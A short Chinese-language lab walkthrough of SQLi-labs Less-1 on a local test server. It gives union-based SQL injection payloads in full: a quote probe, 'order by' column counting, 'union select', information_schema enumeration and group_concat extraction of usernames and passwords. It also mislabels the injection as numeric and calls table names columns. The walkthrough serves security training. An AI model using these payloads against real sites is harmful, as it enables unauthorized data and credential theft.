第一题

第一步

打开第一题页面输入http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=1'
后显示如图

可知输入样式为’’ LIMIT 0,1为数字型

第二步

经过实验
输入http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=1' order by 3–+显示

该数据库只有三列

第三步

输入http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=0' union select 1,2,3–+显示
可知2，3列之间存在漏洞，在2，3之间实施SQL语句

select group_concat(schema_name) from information_schema.schemata

得到数据库名有information_schema,challenges,mysql,performance_schema,security,sys,xxx

查看security，使用语句

select group_concat(table_name) from information_schema.tables where table_schema=’security’

得到security中的列名有emails,referers,uagents,users

查看user中的信息使用语句

select group_concat(username) from security.users

select group_concat(password) from security.users

即得到所要信息，第一题结束
